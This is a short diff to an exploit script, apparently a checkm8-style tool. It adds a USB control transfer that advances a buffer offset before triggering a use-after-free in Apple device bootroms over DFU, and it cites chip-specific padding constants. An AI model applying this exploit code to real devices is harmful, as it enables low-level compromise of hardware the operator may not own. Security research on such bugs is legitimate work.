@@ -975,6 +975,17 @@ def exploit_native(args):
                             timeout_ms=500, name='async DNLOAD')
     if args.debug:
         debug_raw('async DNLOAD', rc, info)
+    # Advance the buffer offset before triggering the UaF (original axi0mX
+    # phase-2 step the transliteration had dropped): a 0x00/0x00 control
+    # carrying overwrite_offset bytes of 'A', landing as data on the poised
+    # heap state left by the cancelled DNLOAD.  For S5L8947 this is
+    # 'A'*0x660; the a1exdandy A5 constants give 0x6C0 (== --padding).
+    adv = args.padding
+    rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, adv, b'A' * adv,
+                            abandon=False, timeout_ms=50,
+                            name='advance offset %#x' % adv)
+    if args.debug:
+        debug_raw('advance offset', rc, info)
     rc, info = usb.raw_ctrl(handle, 0x21, 4, 0, 0, 0, b'', abandon=False,
                             timeout_ms=200, name='DFU_ABORT')
     if args.debug:
